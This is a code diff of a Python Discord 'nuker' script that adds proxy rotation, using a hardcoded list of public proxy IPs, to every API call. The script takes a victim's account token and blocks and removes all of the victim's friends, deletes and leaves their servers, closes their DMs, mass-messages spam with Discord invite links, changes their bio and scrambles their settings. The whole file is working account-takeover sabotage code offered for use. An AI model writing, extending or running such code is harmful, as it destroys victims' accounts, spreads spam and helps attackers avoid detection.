@@ -30,6 +30,52 @@ blue = {Fore.LIGHTCYAN_EX}
 magenta = {Fore.LIGHTMAGENTA_EX}
 reset = {Fore.RESET}
 icon = Fore.LIGHTMAGENTA_EX + "["+ Fore.LIGHTCYAN_EX + "<3" + Fore.MAGENTA + "]  " + Fore.RESET
+try:
+    proxies = open('proxy.txt', "r").read().splitlines()
+except Exception as e:
+    print(f'{icon}proxy.txt not found. creating one...')
+    sleep(1)
+    with open("proxy.txt", "w") as f:
+        prox = r"""
+67.205.179.247:8118
+206.189.199.91:80
+167.172.158.85:81
+172.105.107.223:3128
+51.222.13.193:10084
+51.222.121.190:36223
+100.26.33.91:80
+3.220.76.84:80
+3.93.201.212:9999
+149.56.247.67:59166
+34.239.204.118:80
+34.75.202.63:80
+64.225.13.199:59166
+159.65.245.126:59166
+3.128.142.113:80
+162.216.18.189:59166
+143.42.138.176:80
+72.52.217.188:80
+3.143.37.255:80
+62.151.182.111:80
+45.79.17.203:80
+155.138.132.50:80
+162.223.94.163:80
+209.145.60.213:80
+52.23.86.225:80
+206.189.203.161:59166
+23.238.33.186:80
+34.229.165.231:8088
+172.104.20.199:59166
+139.144.31.132:59166        
+        
+        
+"""
+        f.write(prox)
+        print(f'{icon} made proxy.txt  ...')
+        sleep(4)
+        os.system('cls')
+#proxy = random.choice(proxies)
+#proxies={"http": proxy}
 
 bn = """
 
@@ -172,9 +218,12 @@ def friends(token:str):
 
 
 def block(token:str):
+    proxies = open('proxy.txt', "r").read().splitlines()
+    proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
     headers = {"authorization": token, "user-agent": "bruh6/9"}
     json = {"type": 2}
-    block_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
+    block_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers, proxies={"http": proxy}).json()
     for i in block_friends_request:
         requests.put(
             f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
@@ -184,64 +233,82 @@ def block(token:str):
         print(f"{icon} Blocked Friend | {i['id']}")
 
 def createServers(token:str, count:int, name:str):
+    proxies = open('proxy.txt', "r").read().splitlines()
+    proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
     set_console_title("Unknown nuker")
     headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
     for i in range(int(count)):
         print(f"{icon}[{str(i+1)}] Created Server")
         json = { 'name': name }
-        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=json)
+        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=json, proxies={"http": proxy})
     time.sleep(2)
 
 
 def close_all_dms(token:str):
+    proxies = open('proxy.txt', "r").read().splitlines()
+    proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
     set_console_title("Unknown nuker")
     headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
-    close_dm_request = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
+    close_dm_request = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers, proxies={"http": proxy}).json()
     for channel in close_dm_request:
         print(f"{icon} {Fore.LIGHTCYAN_EX}ID: "+channel['id'] + Fore.RESET)
         requests.delete(
             f"https://canary.discord.com/api/v8/channels/{channel['id']}",
-            headers=headers,)
+            headers=headers, proxies={"http": proxy})
 
 
 def massDM(token:str, content:str):
+    proxies = open('proxy.txt', "r").read().splitlines()
+    proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
     headers = {'Authorization': token}
-    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
+    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token), proxies={"http": proxy}).json()
     for channel in channelIds:
         try:
             requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
             headers=headers,
-            data={"content": f"{content}"})
+            data={"content": f"{content}"}, proxies={"http": proxy})
             print(f"{icon} {Fore.LIGHTCYAN_EX}ID: "+channel['id'] + Fore.RESET)
         except Exception as e:
             print(f"The following error has been encountered and is being ignored: {e}")
 
 def delete_servers(token:str):
-        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
+        proxies = open('proxy.txt', "r").read().splitlines()
+        proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
+        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token), proxies={"http": proxy}).json()
         for guild in guildsIds:
              try:
-                 requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
+                 requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token}, proxies={"http": proxy})
                  print(f'{icon}Deleted: '+guild['name']+Fore.RESET)
              except Exception as e:
                  print(f"The following error has been encountered and is being ignored: {e}")
 
 def delete_friends(token:str):
-        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
+        proxies = open('proxy.txt', "r").read().splitlines()
+        proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
+        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token), proxies={"http": proxy}).json()
         for friend in friendIds:
              try:
                requests.delete(
-               f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
+               f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token), proxies={"http": proxy})
                print(f"{icon}Removed Friend: "+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
              except Exception as e:
                 print(f"The following error has been encountered and is being ignored: {e}")
 
 def leave_servers(token:str):
+        proxies = open('proxy.txt', "r").read().splitlines()
+        proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
         headers = {'Authorization': token}
-        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
+        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token), proxies={"http": proxy}).json()
         for guild in guildsIds:
              try:
                 requests.delete(
-                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], headers={'Authorization': token})
+                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], headers={'Authorization': token}, proxies={"http": proxy})
                 print(f"{icon}Left Server: "+guild['name']+Fore.RESET)
              except Exception as e:
                   print(f"The following error has been encountered and is being ignored: {e}")
@@ -263,6 +330,9 @@ def hypeSquadChanger(token:str):
 
 
 def fuckAccount(token:str):
+        proxies = open('proxy.txt', "r").read().splitlines()
+        proxy = random.choice(proxies)
+    #, proxies={"http": proxy}
         setting = {
             'theme': 'light',
             'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
@@ -273,7 +343,7 @@ def fuckAccount(token:str):
             'render_embeds': False,
             'render_reactions': False
         }
-        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
+        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting, proxies={"http": proxy})
         print(f"{icon}Fucked his Account")
         time.sleep(2)
 
@@ -283,13 +353,14 @@ def bio(token:str, bio):
     print(f"{icon} changed bio to {bio}")
 
 def wizz(token:str):
+    proxies = open('proxy.txt', "r").read().splitlines()
+    proxy = random.choice(proxies)
     print(f"{icon} fucking account....")
     fuckAccount(token=token)
     print(f"{icon}changing bio....")
     bio(token=token, bio="discord.gg/legittools discord.gg/legitmethods")
     print(f"mass dm.....")
     massDM(token=token, content="""@here bro I got usefull tools, tokens, nitro from 
-    fucked by unknown.ly
     https://discord.gg/legittools 
     https://discord.gg/legitmethods""")
     print(f"{icon} leaving servers...")
